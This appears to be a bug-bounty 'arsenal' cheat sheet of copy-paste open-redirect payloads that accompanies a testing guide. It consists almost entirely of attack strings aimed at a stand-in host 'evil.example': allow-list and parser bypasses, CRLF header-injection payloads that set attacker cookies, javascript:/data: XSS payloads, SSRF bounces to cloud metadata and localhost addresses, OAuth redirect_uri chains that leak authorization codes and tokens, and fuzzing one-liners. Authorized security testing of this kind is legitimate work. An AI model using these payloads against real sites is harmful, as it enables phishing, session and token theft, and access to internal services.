# Open Redirect — Arsenal (copy-paste payloads & bypasses)

> Companion to `OPEN_REDIRECT_TESTING_GUIDE.md`. Replace `evil.example` with **a host you control** and `target.com`
> with the app's real domain. Test cheapest-first (plain → `//` → `\` → `@` → whitelist → encoding → scheme).
> Confirm with `curl -s -D - -o /dev/null "<url>" | grep -i '^location:'` (server sink) or a real browser (JS/meta sink).
> **Prove the ESCALATION** (token/script/internal), not just the hop (guide §15/§16).

---

## 0. Parameter name-set (spray these keys on every endpoint)

```
next  returnUrl  ReturnUrl  return  return_to  returnTo  redirect  redirect_uri  redirect_url  redirectUrl
url  u  r  uri  dest  destination  continue  goto  go  target  to  out  view  window  from  forward  callback
cb  checkout_url  image  image_url  imageurl  file  page  path  domain  host  link  location  rurl  ref  back
success  success_url  cancel_url  fail_url  origin  data  q  site  open  load  navigation
```
Discover hidden ones with **Arjun** / **Param Miner**; harvest historical values with **gau**/**waybackurls**/**katana** + `gf redirect`.

---

## 1. Baseline (naive apps)

```
https://evil.example
https://evil.example/
http://evil.example
//evil.example                      ← protocol-relative: the single most common win
evil.example                        ← scheme-less (server may prepend https://)
https:evil.example
```

## 2. Protocol-relative & backslash (parser gaps — highest yield)

```
//evil.example
/\evil.example
\/\/evil.example
/\/\evil.example
\/evil.example
https:/\evil.example
https:\\evil.example
https:/evil.example
///evil.example
https:///evil.example
////evil.example
/%2f%2fevil.example
/%5cevil.example
/%09/evil.example
```

## 3. `@` userinfo (the real host is after the @)

```
https://target.com@evil.example
https://target.com@evil.example/
https://evil.example\@target.com
https://target.com%40evil.example
https://target.com%2540evil.example
https://target.com:pass@evil.example
https://target.com%20@evil.example
https://target.com%09@evil.example
//target.com@evil.example
https://foo@evil.example@target.com          (multi-@ parser confusion)
```

## 4. Whitelist / allow-list bypass

**"contains target.com":**
```
https://evil.example/target.com
https://evil.example/?x=target.com
https://evil.example/#target.com
https://evil.example/target.com/..
https://target.com.evil.example
https://target.com.evil.example/
https://evil.example/target.com%2f..
```
**"startsWith https://target.com":**
```
https://target.com.evil.example
https://target.com@evil.example
https://target.com%2 f.evil.example
https://target.com\.evil.example
https://target.com%5c.evil.example
https://target.com%2f%2f@evil.example
```
**"endsWith .target.com" / host allow-list:**
```
# register/point a host so it legitimately ends with the allowed suffix, OR use a taken-over subdomain (see Subdomain-Takeover kit):
https://evil-target.com                       (if suffix check is sloppy)
https://sub.target.com                        (if you control sub.target.com via subdomain takeover → a WHITELISTED redirect)
# chain an OPEN REDIRECT on an already-allowed host (redirect → redirect):
https://allowed.target.com/out?url=//evil.example
```

## 5. Encoding & control-character evasion

```
%2f%2fevil.example                    (// url-encoded)
%2F%5Cevil.example
%252f%252fevil.example                (double-encoded // — beats decode-once filters)
https://evil.example%2f%2e%2e
https://evil.example%09                (tab)
https://evil.example%00                (NULL truncation)
https://evil.example%20
https://evil%00.example
https://evil.example%23.target.com     (# encoded)
https://evil.example%3f.target.com     (? encoded)
```

## 6. Unicode / IDN / homoglyph host confusion

```
http://evil。example                   (U+3002 ideographic full stop — parsers may treat as dot)
http://evil｡example                    (U+FF61 halfwidth ideographic full stop)
http://evil．example                    (U+FF0E fullwidth full stop)
https://target.com%E3%80%82evil.example
http://ⓔⓥⓘⓛ.example                    (enclosed alphanumerics — visual)
http://xn--...                         (punycode homoglyph of target.com — phishing-grade look-alike)
```

## 7. CRLF / HTTP response splitting (redirect param reflected into Location)

```
?next=https://target.com/%0d%0aLocation:%20https://evil.example
?next=https://target.com/%0d%0aSet-Cookie:%20session=attacker
?next=https://target.com/%0d%0a%0d%0a<script>alert(document.domain)</script>
?next=https://target.com/%E5%98%8A%E5%98%8DLocation:%20https://evil.example   (unicode CRLF bypass)
?next=/%0d%0aContent-Length:%200%0d%0a%0d%0a
```
> If `%0d%0a` survives into the `Location` header → **CRLF injection / response splitting** (guide §9; CWE-113). Escalate to `Set-Cookie` (session fixation), a second `Location`, or header-based cache poisoning/XSS (cross-ref Host-Header & Request-Smuggling kits).

## 8. `javascript:` / `data:` (CLIENT-SIDE JS sink → DOM-XSS, guide §10)

```
javascript:alert(document.domain)
javascript:alert(document.cookie)
javascript:alert`1`
JaVaScRiPt:alert(1)
java%09script:alert(1)
java%0ascript:alert(1)
javascript:javascript:alert(1)
%6a%61%76%61%73%63%72%69%70%74:alert(1)
javascript:alert(1)//
data:text/html,<script>alert(document.domain)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
vbscript:msgbox(1)                    (legacy IE)
```
> Only fires in a **client-side** sink (`location=`, `location.href`, `.assign()`, `.replace()`, `window.open()`, anchor `href`). A `Location` **response header** ignores non-`http(s)` schemes.

## 9. IP / alternate host forms (mainly for the SSRF-bypass chain, guide §12)

```
http://169.254.169.254/latest/meta-data/            (cloud metadata target for the SSRF bounce)
http://0x7f000001/          http://2130706433/       http://0177.0.0.1/     http://127.1/
http://[::1]/   http://[0:0:0:0:0:ffff:127.0.0.1]/
http://127.0.0.1.nip.io/    http://169.254.169.254.nip.io/
http://localtest.me/        http://spoofed.burpcollaborator.net/
```
Use an **allowed-host open redirect** that bounces to one of these when the SSRF fetcher is locked to an allow-list.

## 10. OAuth / SSO chain payloads (guide §11)

```
# B — open redirect on the ALLOWED client host defeats a strict redirect_uri allow-list:
redirect_uri=https://client.target.com/out?url=//evil.example        (IdP validates client.target.com; bounce leaks code)
redirect_uri=https://client.target.com/redirect?next=https://evil.example
# fragment-preserving bounce (implicit flow access_token in #):
redirect_uri=https://client.target.com/#/redirect?to=//evil.example
# common loose-validation direct wins (try before the bounce chain):
redirect_uri=https://target.com.evil.example/callback
redirect_uri=https://evil.example/callback
redirect_uri=https://target.com@evil.example/callback
```
> Full `redirect_uri` / `state` / PKCE / `response_mode` matrix lives in the **OAuth/SSO kit**. Catch **your own** `code`/`access_token` with `poc/token_catcher.py`.

---

## 11. One-liners (quick confirm)

```bash
# server 30x sink — read Location without following:
curl -s -D - -o /dev/null "https://target.com/login?next=//evil.example" | grep -i '^location:'

# spray the name-set + payload with qsreplace across harvested URLs:
gau target.com | gf redirect | qsreplace '//evil.example' \
  | httpx -silent -location -mc 301,302,303,307,308 | grep -i 'evil.example'

# this kit's fuzzer (control-baselined) + payload matrix:
python3 poc/openredir_fuzz.py -u "https://target.com/login?next=FUZZ" --target target.com --evil evil.example
python3 poc/redirect_payloads.py --target target.com --evil evil.example
```

---

## 12. Confirm-it-lands checklist (don't submit before this)

```
□ The Location / meta / JS sends the browser to a host YOU control (not same-origin, not a fixed partner).
□ You know the SINK TYPE (header / meta / JS) — it decides the ceiling (JS → javascript: → XSS).
□ You tried the ESCALATION: OAuth code/token theft, javascript:/data: XSS, SSRF allow-list bounce, token/session leak.
□ For a bare redirect: you have an HONEST phishing narrative on the trusted origin (Medium), not an inflated "Critical".
□ You are NOT mislabeling a server-side FETCH (that's SSRF) as an open redirect.
□ PoC uses your OWN host, OWN account, OWN token.
```
